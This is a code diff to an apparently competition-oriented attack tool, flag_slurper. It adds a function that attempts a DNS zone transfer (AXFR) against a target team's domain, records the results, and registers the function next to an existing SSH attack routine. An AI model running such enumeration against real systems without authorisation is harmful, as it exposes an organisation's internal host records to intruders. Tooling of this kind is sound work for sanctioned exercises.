@@ -3,6 +3,9 @@ import os
 from typing import Tuple
 
 import paramiko
+import dns.query
+import dns.zone
+from dns.exception import DNSException
 
 from flag_slurper.autolib.post import PostContext
 from .exploit import find_flags, FlagConf, can_sudo, get_file_contents, get_system_info, LimitCreds
@@ -92,6 +95,24 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf,
         return 'Authentication failed', False, False
 
 
+def pwn_dns(url: str, port: int, service: Service, flag_conf: FlagConf,
+            limit_creds: LimitCreds) -> Tuple[str, bool, bool]:
+    try:
+        z = dns.zone.from_xfr(dns.query.xfr(url, service.team.domain))
+        names = z.nodes.keys()
+        for name in names:
+            record = z[name]
+            DNSResult.get_or_create(team=service.team, name=name.to_text(), record=record.to_text(name))
+    except DNSException:
+        return 'Unable to AXFR', False, False
+    except:
+        logger.exception('Cannot connect to DNS for AXFR')
+        return 'Unable to connect', False, False
+    else:
+        return 'Got zone {} from AXFR'.format(service.team.domain), True, False
+
+
 PWN_FUNCS = {
     'ssh': pwn_ssh,
+    'dns': pwn_dns,
 }
